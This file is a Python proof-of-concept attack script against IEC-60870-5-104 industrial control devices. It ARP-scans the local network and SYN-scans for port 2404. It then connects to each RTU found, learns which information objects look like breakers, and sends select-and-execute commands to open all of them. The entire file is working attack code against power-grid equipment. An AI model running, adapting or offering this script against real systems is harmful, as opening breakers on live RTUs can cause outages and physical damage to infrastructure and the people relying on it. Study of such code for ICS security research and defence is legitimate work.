#!/usr/bin/env python3
'''
A PoC attack against IEC-60870-5-104 devices with single-value information objects.

Upon selecting a NIC, it will scan the broadcast domain for any hosts with the open
port TCP 2404. For each detected host, it will attempt to establish a connection,
start the data transmission and listen for spontaneous values transmitted from the
hosts. For each value it receives, it will check whether it is a single-point value
and track the information object address. After a reasonable time (30 seconds), it
will go through each host sending a command to turn the value of each tracked
information object to 'OFF' (0).
'''

from threading import Thread
from socket import socket, AF_INET, SOCK_STREAM, IPPROTO_TCP, SHUT_RDWR
from time import sleep
from inquirer import list_input
from netifaces import AF_INET as INET, AF_LINK, ifaddresses, interfaces
from random import randint
from scapy.sendrecv import srp1, sr1, sr
from scapy.layers.l2 import ARP, Ether
from scapy.layers.inet import IP, TCP
from ipaddress import ip_network, IPv4Address, IPv4Network, IPv6Network
from typing import Union

# NEFICS imports
from nefics.protos.iec10x.packets import APDU, APCI, ASDU, IO45, VSQ
from nefics.protos.iec10x.iec104 import IEC104_PORT, MAX_LENGTH

def arpscan(hosts: list[IPv4Address]):
    global alive
    global address
    for host in hosts:
        if str(host) != address['addr']:
            print('[-] Trying {0:s} ...\r'.format(str(host)), end='')
            response = srp1(Ether(src=address['mac'], dst='ff:ff:ff:ff:ff:ff', type=0x0806)/ARP(op=0x1, psrc=address['addr'], pdst=str(host)), iface=address['iface'], retry=0, timeout=0.33, verbose=0)
            if response is not None and response.haslayer('ARP') and response['ARP'].op == 0x2:
                print('   [!] {0:s} is alive'.format(str(host)))
                alive.append(str(host))

def handle_rtu(sock: socket, ipaddr: str):
    global rtu_data
    global rtu_keepalive
    global rtu_thread_killswitch
    global rtu_hasbreakers
    buffer : bytes
    sock.connect((ipaddr, IEC104_PORT))
    sock.settimeout(10)
    # Start data transmission
    apdu : APDU = APDU()/APCI(type=0x03, UType=0x01)
    buffer = apdu.build()
    sock.send(buffer)
    rtu_keepalive[ipaddr].start()
    while not rtu_thread_killswitch[ipaddr]:
        try:
            buffer = sock.recv(MAX_LENGTH)
            apdu = APDU(buffer)
            assert apdu.haslayer('APCI') and apdu.haslayer('ASDU')
            apci = apdu['APCI']
            asdu = apdu['ASDU']
            if apci.type == 0x00:
                if 'ca' not in rtu_data[ipaddr].keys():
                    rtu_data[ipaddr]['ca'] = asdu.CommonAddress
                rtu_data[ipaddr]['rx'] = apci.Tx
                if asdu.type in [0x01, 0x02, 0x03, 0x04, 0x1E, 0x1F]:
                    if ipaddr not in rtu_hasbreakers.keys():
                        rtu_hasbreakers[ipaddr] = dict()    
                        rtu_hasbreakers[ipaddr]['ioas'] = list()
                        print('   [!] RTU in {0:s} has breakers'.format(ipaddr))
                    io = asdu.IO
                    ioa = io[0].IOA if isinstance(io, list) else io.IOA
                    if asdu.type in [0x01, 0x02, 0x1E]:
                        values = [x.SIQ for x in io] if isinstance(io, list) else io.SIQ
                    else:
                        values = [x.DIQ for x in io] if isinstance(io, list) else io.DIQ
                    values = list([values]) if not isinstance(values, list) else values
                    for x in [y for y  in range(ioa, ioa + len(values)) if y not in rtu_hasbreakers[ipaddr]['ioas']]:
                        rtu_hasbreakers[ipaddr]['ioas'].append(x)
                        print('   [!] New potential breaker found in {0:s}. IOA: {1:d}'.format(ipaddr, x))
        except (TimeoutError, KeyError, IndexError, AssertionError):
            pass

def keep_alive(ipaddr: str):
    global rtu_thread_killswitch
    global rtu_comm
    while not rtu_thread_killswitch[ipaddr]:
        apdu = APDU()/APCI(type=0x03, UType=0x10)
        rtu_comm[ipaddr].send(apdu.build())
        sleep(10)

def main():
    global address
    global alive
    global rtu_comm
    global rtu_data
    global rtu_threads
    global rtu_keepalive
    global rtu_thread_killswitch
    global rtu_hasbreakers
    buffer : bytes
    iface : str = list_input(
        'Choose an interface ',
        choices=[f'{x:s} ({ifaddresses(x)[INET][0]["addr"]:s})' for x in interfaces() if INET in ifaddresses(x)]
    )
    iface = iface.split(' ')[0]
    print('[+] Using ' + str(iface))
    address = ifaddresses(iface)[INET][0]
    address['mac'] = ifaddresses(iface)[AF_LINK][0]['addr']
    address['iface'] = iface
    subnet : Union[IPv4Network, IPv6Network] = ip_network(address['addr'] + '/' + address['netmask'], strict=False)
    assert isinstance(subnet, IPv4Network)
    nethosts : list[IPv4Address] = list(subnet.hosts())
    print('[+] Searching for live hosts in {0:s} ...'.format(str(subnet)))
    alive = list()
    arpscan_threads : list[Thread] = []
    for hosts in [nethosts[i:i + 16] for i in range(0, len(nethosts), 16)]:
        t = Thread(target=arpscan, kwargs={'hosts': hosts})
        t.start()
        arpscan_threads.append(t)
    while len(arpscan_threads):
        for t in arpscan_threads:
            t.join(1)
            if not t.is_alive():
                arpscan_threads.pop(arpscan_threads.index(t))
    print('[+] Scanning for RTUs ...')
    rtus : list[str] = list()
    for host in alive:
        if host != address['addr']:
            sport = randint(1025,65535)
            print('[-] Trying {0:s} ...\r'.format(host), end='')
            response = sr1(IP(src=address['addr'], dst=host)/TCP(sport=sport, dport=IEC104_PORT, flags='S'), iface=iface, timeout=0.1, retry=0, verbose=0)
            if response is None:
                # Filtered
                pass
            elif response.haslayer('TCP'):
                if response['TCP'].flags == 0x12:
                    # Open port -- Probably an RTU
                    sr(IP(src=address['addr'], dst=host)/TCP(sport=sport, dport=IEC104_PORT, flags='R'), iface=iface, timeout=0.1, verbose=0)
                    print('   [!] Found RTU at %s' % str(host))
                    rtus.append(str(host))
                elif response['TCP'].flags == 0x14:
                    # Closed
                    pass
            elif response.haslayer('ICMP') and response['ICMP'].type == 3 and response['ICMP'].code in [1, 2, 3, 9, 10, 13]:
                # Filtered
                pass
    print('[+] Scanning complete !' + ' ' * 20)
    print('[+] Probing RTUs ...')
    rtu_comm = dict()
    rtu_data = dict()
    rtu_threads = dict()
    rtu_keepalive = dict()
    rtu_thread_killswitch = dict()
    rtu_hasbreakers = dict()
    for rtu_ip in rtus:
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        rtu_comm[rtu_ip] = sock
        if rtu_ip not in rtu_data.keys():
            rtu_data[rtu_ip] = dict()
            rtu_data[rtu_ip]['ioas'] = dict()
        rtu_data[rtu_ip]['tx'] = 0
        rtu_data[rtu_ip]['rx'] = 0
        rtu_threads[rtu_ip] = Thread(target=handle_rtu, kwargs={'sock': sock, 'ipaddr': rtu_ip})
        rtu_keepalive[rtu_ip] = Thread(target=keep_alive, kwargs={'ipaddr': rtu_ip})
        rtu_thread_killswitch[rtu_ip] = False
        rtu_threads[rtu_ip].start()
    sleep(30)
    print('[+] Opening all breakers ...')
    for rtu_ip, ioas in rtu_hasbreakers.items():
        print('   [-] Opening breakers in {0:s} ...'.format(rtu_ip))
        for ioa in ioas['ioas']:
            print('      [#] Opening IOA {:d} ...'.format(ioa))
            # SELECT
            rtu_data[rtu_ip]['tx'] += 1
            apdu = APDU()
            apdu /= APCI(type=0x00, Tx=rtu_data[rtu_ip]['tx'], Rx=rtu_data[rtu_ip]['rx'])
            io = IO45(_sq=0, _balanced=False, IOA=ioa, SE=0b1, SCS=0)
            apdu /= ASDU(type=0x2d, VSQ=VSQ(SQ=0, number=1), CommonAddress=rtu_data[rtu_ip]['ca'], IO=io)
            buffer = apdu.build()
            rtu_comm[rtu_ip].send(buffer)
            sleep(2)
            # EXECUTE
            rtu_data[rtu_ip]['tx'] += 1
            apdu = APDU()
            apdu /= APCI(type=0x00, Tx=rtu_data[rtu_ip]['tx'], Rx=rtu_data[rtu_ip]['rx'])
            io = IO45(_sq=0, _balanced=False, IOA=ioa, SE=0b0, SCS=0)
            apdu /= ASDU(type=0x2d, VSQ=VSQ(SQ=0, number=1), CommonAddress=rtu_data[rtu_ip]['ca'], IO=io)
            buffer = apdu.build()
            rtu_comm[rtu_ip].send(buffer)
            sleep(2)
    print('[+] Done!')
    print('[+] Closing connections ...')
    for rtu_ip in rtus:
        rtu_thread_killswitch[rtu_ip] = True
        rtu_threads[rtu_ip].join()
        rtu_keepalive[rtu_ip].join()
        try:
            # Stop data transmission
            apdu : APDU = APDU()/APCI(type=0x03, UType=0x04)
            buffer = apdu.build()
            rtu_comm[rtu_ip].send(buffer)
            sleep(0.2)
            buffer = rtu_comm[rtu_ip].recv(MAX_LENGTH)
            apdu = APDU(buffer)
        except TimeoutError:
            pass
        rtu_comm[rtu_ip].shutdown(SHUT_RDWR)
        rtu_comm[rtu_ip].close()
    print('[+] Bye!')

if __name__ == '__main__':
    from sys import stderr
    try:
        # globals
        global address
        global alive
        global rtu_comm
        global rtu_data
        global rtu_threads
        global rtu_thread_killswitch
        global rtu_hasbreakers
        main()
    except AssertionError as e:
        stderr.write(f'{str(e)}\n')
        stderr.flush()
